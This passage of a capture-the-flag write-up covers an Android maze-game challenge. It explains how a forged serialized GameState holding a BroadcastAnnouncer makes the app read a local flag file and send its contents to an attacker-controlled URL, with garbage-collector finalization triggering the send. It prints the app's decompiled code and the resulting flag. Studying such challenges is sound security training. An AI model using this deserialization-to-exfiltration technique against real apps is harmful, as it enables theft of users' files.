+    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">perimeter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Square</span> <span class="token keyword">extends</span> <span class="token class-name">Shape</span> <span class="token punctuation">{</span>
+
+    <span class="token keyword">public</span> <span class="token function">Square</span><span class="token punctuation">(</span><span class="token keyword">int</span> side<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">super</span><span class="token punctuation">(</span>side<span class="token punctuation">,</span> side<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">area</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token comment">// or Math.Pow(...)</span>
+        <span class="token keyword">return</span> base <span class="token operator">*</span> height<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">perimeter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> base <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">diagonal</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> base <span class="token operator">*</span> <span class="token number">1.41</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Rectangle</span> <span class="token keyword">extends</span> <span class="token class-name">Shape</span> <span class="token punctuation">{</span>
+
+    <span class="token keyword">public</span> <span class="token function">Rectangle</span><span class="token punctuation">(</span><span class="token keyword">int</span> base<span class="token punctuation">,</span> <span class="token keyword">int</span> height<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">super</span><span class="token punctuation">(</span>base<span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">area</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token comment">// or Math.Pow(...)</span>
+        <span class="token keyword">return</span> base <span class="token operator">*</span> height<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">perimeter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>base <span class="token operator">+</span> height<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">diagonal</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">sqrt</span><span class="token punctuation">(</span>base <span class="token operator">*</span> base <span class="token operator">+</span> height <span class="token operator">*</span> height<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span>
+</code></pre>
+<pre class=" language-java"><code class="prism  language-java">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    Square square  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Square</span><span class="token punctuation">(</span><span class="token number">1337</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    Rectangle rect <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Rectangle</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    r<span class="token punctuation">.</span><span class="token function">diagonal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// returns 39.21</span>
+    r<span class="token punctuation">.</span><span class="token function">area</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// returns 481</span>
+
+    Shape shape <span class="token operator">=</span> <span class="token punctuation">(</span>Shape<span class="token punctuation">)</span>rect<span class="token punctuation">;</span>
+
+    <span class="token comment">// shape.diagonal() is not accessible</span>
+    shape<span class="token punctuation">.</span><span class="token function">area</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// returns 481 - the rectangle area - and not -1</span>
+
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+</code></pre>
+<p>What happens here?! We have a <strong>Shape</strong> class which can’t be initialized but their children can be (<strong>Square</strong>, <strong>Rectangle</strong>).  <strong>Square</strong> and <strong>Rectangle</strong> extends their parent with a method named <strong>diagonal</strong>. This method is accessible only when we’re calling it from a <strong>Square</strong> or <strong>Rectangle</strong> type var. The following line:</p>
+<pre class=" language-java"><code class="prism  language-java">    Shape shape <span class="token operator">=</span> <span class="token punctuation">(</span>Shape<span class="token punctuation">)</span>rect<span class="token punctuation">;</span>
+</code></pre>
+<p>is called <strong>Upcasting</strong>. We lose <strong>Rectangle</strong> extended methods but we can still call <strong>Shape</strong> ones (area and perimeter).</p>
+<h3 id="statecontroller-stateloader-and-broadcastannouncer">StateController, StateLoader and BroadcastAnnouncer</h3>
+<p>StateController is inherited by <strong>StateLoader</strong> and <strong>BroadcastAnnouncer</strong>. Since both classes are <strong>Serializable</strong>, we can forge a <strong>GameState</strong> object and pass it through <strong>cereal</strong> extra. The crafted <strong>GameState</strong> can have both, a <strong>StateLoader</strong> or a <strong>BroadcastAnnouncer</strong>, as <strong>stateLoader</strong> property. If you carefully read the above section you should know that it doesn’t matter. Both classes implement (and override) <strong>load</strong> method.</p>
+<p><strong>StateLoader</strong> is useless since it just reads and writes locally. We need a class that reads a file locally and sends its content to a remote location.</p>
+<h3 id="broadcastannouncer">BroadcastAnnouncer</h3>
+<p>BroadcastAnnouncer has everything we need:</p>
+<pre class=" language-java"><code class="prism  language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BroadcastAnnouncer</span> <span class="token keyword">extends</span> <span class="token class-name">StateController</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> String destUrl<span class="token punctuation">;</span>
+    <span class="token keyword">private</span> String stringRef<span class="token punctuation">;</span>
+    <span class="token keyword">private</span> String stringVal<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token function">BroadcastAnnouncer</span><span class="token punctuation">(</span>String str<span class="token punctuation">,</span> String str2<span class="token punctuation">,</span> String str3<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">super</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>stringRef <span class="token operator">=</span> str2<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>destUrl <span class="token operator">=</span> str3<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span>Context context<span class="token punctuation">,</span> Object obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                HttpURLConnection httpURLConnection<span class="token punctuation">;</span>
+                <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                    StringBuilder stringBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>BroadcastAnnouncer<span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span>destUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"/announce?val="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>BroadcastAnnouncer<span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span>stringVal<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    httpURLConnection <span class="token operator">=</span> <span class="token punctuation">(</span>HttpURLConnection<span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>stringBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>httpURLConnection<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    httpURLConnection<span class="token punctuation">.</span><span class="token function">disconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    e2<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> th<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    httpURLConnection<span class="token punctuation">.</span><span class="token function">disconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> Object <span class="token function">load</span><span class="token punctuation">(</span>Context context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>stringVal <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            BufferedReader bufferedReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stringRef<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                context <span class="token operator">=</span> bufferedReader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>context <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                StringBuilder stringBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stringVal<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">this</span><span class="token punctuation">.</span>stringVal <span class="token operator">=</span> stringBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">FileNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e2<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setStringRef</span><span class="token punctuation">(</span>String str<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>stringRef <span class="token operator">=</span> str<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> String <span class="token function">getStringRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>stringRef<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>If we forge a <strong>BroadcastAnnouncer</strong> object with <strong>stringRef</strong> property set to <em>/data/local/tmp/challenge4</em> (our flag path) and <strong>destUrl</strong> set to a controlled domain or remote http listener the <strong>load</strong> method will read its content and keep it into <strong>stringVal</strong> property while the <strong>save</strong> one will send it to <strong>destUrl/announce?val=</strong>.</p>
+<p>As said, the method that sends <strong>stringVal</strong> over the network is the <strong>save</strong> one. We need to spot the code that fires it.</p>
+<h3 id="a-step-back">A step back</h3>
+<p>Let’s check again the <strong>GameState</strong> class:</p>
+<pre class=" language-java"><code class="prism  language-java">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">finalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>GameManager<span class="token punctuation">.</span>levelsCompleted <span class="token operator">&gt;</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>context <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>stateController<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>context<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+</code></pre>
+<p>The <strong>finalize</strong> method is called by <a href="https://en.wikipedia.org/wiki/Garbage_collection_%28computer_science%29">Garbage Collector</a> when an object is no more referenced from another one. Since the <strong>initialize</strong> method is called on the deserialized <strong>cereal</strong> object but the resulting <strong>GameState</strong>   object is not referenced by (or saved in) any other var/property the GC should call the <strong>finalize</strong> method honoring its own task.</p>
+<p>As said <strong>it should</strong> (and it will) but you don’t know when. From the <a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Object.html#finalize%28%29">java doc</a> :</p>
+<blockquote>
+<p>The general contract of <code>finalize</code> is that it is invoked if and when the JavaTM virtual machine has determined that there is no longer any means by which this object can be accessed by any thread that has not yet died, except as a result of an action taken by the finalization of some other object or class which is ready to be finalized.</p>
+</blockquote>
+<p>Not a big deal nevertheless. We can send the crafted serialized object multiple times forcing the JVM to run the GC - sooner or later the garbage will invoke that method -.</p>
+<h3 id="mission-accomplished...-not-yet">Mission accomplished… not yet!</h3>
+<p>To allow <strong>save</strong> method to be called at least 3 levels (<code>GameManager.levelsCompleted &gt; 2</code>) must be completed.</p>
+<p>To note how completely wrong you'll be by thinking that you’ve control of <strong>levelsCompleted</strong> property too:</p>
+<pre class=" language-java"><code class="prism  language-java">    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">initialize</span><span class="token punctuation">(</span>Context context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>context <span class="token operator">=</span> context<span class="token punctuation">;</span>
+        GameState gameState <span class="token operator">=</span> <span class="token punctuation">(</span>GameState<span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>stateController<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>gameState <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>playerX <span class="token operator">=</span> gameState<span class="token punctuation">.</span>playerX<span class="token punctuation">;</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>playerY <span class="token operator">=</span> gameState<span class="token punctuation">.</span>playerY<span class="token punctuation">;</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>seed <span class="token operator">=</span> gameState<span class="token punctuation">.</span>seed<span class="token punctuation">;</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>levelsCompleted <span class="token operator">=</span> gameState<span class="token punctuation">.</span>levelsCompleted<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>Even if <strong>gameState</strong> has <strong>levelsCompleted</strong> property, its value is assigned to <strong>this.levelsCompleted</strong> property instance an not to <strong>GameManager</strong> one.</p>
+<p>We have to automate this step by using broadcast messages that give us info about the maze and let us move the player. We need a maze solver.</p>
+<p>Googling a bit I landed <a href="http://www.baeldung.com/java-solve-maze">here</a>. It seems that most used (and simple) algorithms to solve mazes are:</p>
+<ul>
+<li>depth-first search (DFS);</li>
+<li>breadth-first search (BFS).</li>
+</ul>
+<p>I was going to code a basic maze solver using one of the above algorithms when I noticed an interesting thing.</p>
+<h3 id="a-logical-issue">A logical issue</h3>
+<p>Every time a level is completed, the next one is randomly generated using a <strong>seed</strong>.</p>
+<pre class=" language-java"><code class="prism  language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GameManager</span> <span class="token keyword">extends</span> <span class="token class-name">SimpleOnGestureListener</span> <span class="token punctuation">{</span>
+
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">long</span> seed<span class="token punctuation">;</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">long</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token punctuation">(</span>levelsCompleted <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span><span class="token function">gc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>drawables<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>maze <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Maze</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>drawables<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>maze<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>exit <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exit</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>maze<span class="token punctuation">.</span><span class="token function">getEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>drawables<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>exit<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>player <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Player</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>maze<span class="token punctuation">.</span><span class="token function">getStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>drawables<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>player<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">movePlayer</span><span class="token punctuation">(</span>Point point<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>exit<span class="token punctuation">.</span><span class="token function">getPoint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">getPoint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            levelsCompleted <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+            <span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>seed<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>broadcastAnnouncer<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>view<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>loader<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>view<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">GameState</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">getX</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">getY</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>seed<span class="token punctuation">,</span> levelsCompleted<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        view<span class="token punctuation">.</span><span class="token function">invalidate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> z<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Probably, while coding, someone forgot to assign/reassign <strong>seed</strong> value once the level has been completed. Thanks to this little error mazes don’t change (except for 1st level).</p>
+<p><img src="https://i.imgur.com/l1eq6Hh.png" alt=""></p>
+<h3 id="hardcode-is-the-way">Hardcode is the way</h3>
+<p>To save time I’ve hardcoded each possible solution (totally 4) into the final app that you can find in my repo.</p>
+<p><a href="https://github.com/luc10/h1-702-2018-ctf-wu/challenge-4/">https://github.com/luc10/h1-702-2018-ctf-wu/challenge-4/</a></p>
+<h2 id="internal-server-error">500 Internal Server Error</h2>
+<p>Unfortunately, setting up a web server to validate solutions is not so easy as solving this challenge. <strong>I must thank <a href="https://github.com/breadchris">Christopher Thompson</a> (the dev behind all challenges) for his patience</strong>. After different attempts to make the remote server more reliable and setting up a local one to try my exploit he forgot to set the right permissions to the flag file (all I got were empty requests from his IP) and was finally forced to give me the flag which is:</p>
+<p><code>flag{my_favorite_cereal_and_mazes}</code></p>
+</div>
+</body>
+
+</html>
